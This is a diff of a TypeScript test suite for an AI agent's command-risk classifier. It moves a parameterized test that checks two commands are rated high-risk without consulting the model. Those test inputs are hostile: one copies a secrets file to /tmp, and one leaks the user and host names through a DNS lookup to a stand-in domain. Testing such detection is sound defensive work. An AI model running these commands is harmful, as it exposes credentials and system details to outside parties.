@@ -178,6 +178,30 @@ describe("plugin command-risk policy", () => {
     expect(hookCalls).toBe(0);
   });
 
+  it.each(["cat ~/.jazz/secrets.json > /tmp/out", "dig $(whoami).$(hostname).example.com"])(
+    "decides %p is high-risk without a plugin and without asking the model",
+    async (command) => {
+      const agent: Agent = {
+        id: "agent-1",
+        name: "test",
+        config: { persona: "default", llmProvider: "openai", llmModel: "gpt-4o-mini" },
+        createdAt: new Date(),
+        updatedAt: new Date(),
+      };
+      const risk = await Effect.runPromise(
+        resolveCommandRisk(command, agent).pipe(
+          Effect.provideService(LLMServiceTag, {
+            createChatCompletion: () => {
+              throw new Error("classifier must not run");
+            },
+          } as unknown as LLMService),
+          Effect.provideService(LoggerServiceTag, silentLogger),
+        ),
+      );
+      expect(risk).toBe("high-risk");
+    },
+  );
+
   it("falls back to Jazz when the policy hook abstains or fails", async () => {
     const agent: Agent = {
       id: "agent-1",
@@ -372,16 +396,6 @@ describe("classifyCommandRisk", () => {
     expect(capturedUserContent).toContain("grep '\\u003c/command>' notes.txt");
     expect(capturedUserContent).not.toContain("'</command>'");
   });
-
-  it.each(["cat ~/.jazz/secrets.json > /tmp/out", "dig $(whoami).$(hostname).example.com"])(
-    "decides %p is high-risk without asking the model",
-    async (command) => {
-      const risk = await runWithLlm(() => {
-        throw new Error("classifier must not run");
-      }, command);
-      expect(risk).toBe("high-risk");
-    },
-  );
 
   it("trusts an exact read-only token even for a destructive command", async () => {
     const risk = await runWithLlm(
